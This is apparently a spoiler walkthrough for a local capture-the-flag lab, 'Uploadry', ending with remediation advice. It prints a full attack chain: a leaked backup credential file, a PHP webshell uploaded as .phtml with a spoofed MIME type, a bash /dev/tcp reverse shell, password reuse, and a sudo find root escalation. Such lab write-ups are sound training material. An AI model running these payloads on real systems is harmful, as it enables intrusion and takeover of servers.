# SOLUTION — Uploadry (spoilers)

Full intended path. Target: `http://127.0.0.1:8080`. Try it yourself first.

## 1. Enumeration

```bash
curl -s http://127.0.0.1:8080/robots.txt
#   Disallow: /admin   /uploads   /config

# Directory/content discovery
ffuf -u http://127.0.0.1:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

`/admin/` is a login panel. `/config/db.php` executes (no source leak there),
but the admin folder has a leftover **backup file served as plain text**:

```bash
curl -s http://127.0.0.1:8080/admin/config.php.bak
#   $ADMIN_USER = 'admin';
#   $ADMIN_PASS = 'Sup3rS3cr3t!2023';
```

## 2. Foothold — file-upload RCE

Log in to `/admin/` with `admin : Sup3rS3cr3t!2023`. The uploader claims to
accept images only. Its checks are weak:

- it trusts the **client-supplied MIME type** (`Content-Type` of the part), and
- it blacklists extensions (`php`, `html`, `js`, …) but **misses `.phtml`**,
  which Apache still executes as PHP.

Make a webshell and upload it with a spoofed MIME type:

```bash
echo '<?php system($_GET["c"]); ?>' > shell.phtml

curl -s http://127.0.0.1:8080/admin/dashboard.php \
  -b cookie.txt \
  -F 'photo=@shell.phtml;type=image/png'
```

(Grab the session cookie first by logging in with `curl -c cookie.txt`, or do
the whole thing in Burp.) Then:

```bash
curl -s 'http://127.0.0.1:8080/uploads/shell.phtml?c=id'
#   uid=33(www-data) gid=33(www-data) ...
```

Upgrade to a reverse shell (from your Mac, listener `nc -lvnp 4444`):

```bash
curl -s 'http://127.0.0.1:8080/uploads/shell.phtml' --data-urlencode \
  'c=bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"'
```

## 3. Lateral movement — credential reuse

As `www-data`, read the DB config the app ships:

```bash
cat /var/www/html/config/db.php
#   $DB_USER = 'michael';
#   $DB_PASS = 'Photos#Backup2023';
```

That password is reused for the system account:

```bash
su michael          # password: Photos#Backup2023
cat /home/michael/user.txt    # user flag
```

(You can also SSH in: `ssh michael@127.0.0.1 -p <lima_ssh_port>`.)

## 4. Privilege escalation — sudo + GTFOBins

```bash
sudo -l
#   (root) NOPASSWD: /usr/bin/find
```

`find` can spawn a shell (GTFOBins):

```bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
id            # uid=0(root)
cat /root/root.txt    # root flag
```

## Remediation (the defensive lesson)

- Validate uploads by **content**, not extension/MIME; store them outside the
  web root or serve from a path with script execution disabled.
- Never ship `.bak`/source backups in the web root.
- Don't reuse the DB password for a login account; don't keep plaintext creds
  on disk.
- Scope `sudo` to specific, non-shell-spawning actions; audit against GTFOBins.
